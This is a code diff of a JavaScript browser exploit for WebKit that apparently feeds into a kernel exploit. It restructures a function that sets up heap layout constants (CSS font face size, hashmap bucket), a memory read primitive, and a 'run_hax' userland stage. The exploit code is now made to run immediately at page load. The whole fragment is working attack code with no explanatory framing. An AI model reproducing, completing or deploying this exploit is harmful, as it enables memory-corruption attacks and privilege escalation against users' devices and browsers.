@@ -665,7 +665,6 @@ function kernelExploit() {
  runKEX();
 }
 
-function webkitExploit() {
 var PAGE_SIZE = 16384;
 var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
@@ -1137,9 +1136,6 @@ window.ref_mem = function(p, sz)
             return new int64(obj_master[4], obj_master[5]);
         }
     };
-    window.p = prim;
-    run_hax();
-}
 
 function run_hax() {
     userland();
@@ -1154,4 +1150,5 @@ function run_hax() {
     }
 }
 
-webkitExploit();
+    window.p = prim;
+    run_hax();
